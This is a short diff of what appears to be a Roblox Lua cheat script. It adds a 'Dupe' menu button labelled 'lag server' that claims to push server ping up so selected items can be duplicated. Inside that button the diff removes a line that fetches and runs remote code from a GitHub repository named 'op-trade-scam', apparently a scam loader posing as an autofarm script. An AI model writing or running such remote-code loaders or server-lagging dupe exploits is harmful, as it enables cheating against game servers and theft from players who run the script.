@@ -8,4 +8,3 @@ local MainSection = Main:NewSection("Dupe")
 
 MainSection:NewButton("lag server", "make server go to up 1000 ping to dupe selected items", function()
 
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Scripts-Project-wd/op-trade-scam/main/AutofarmerScript'))()
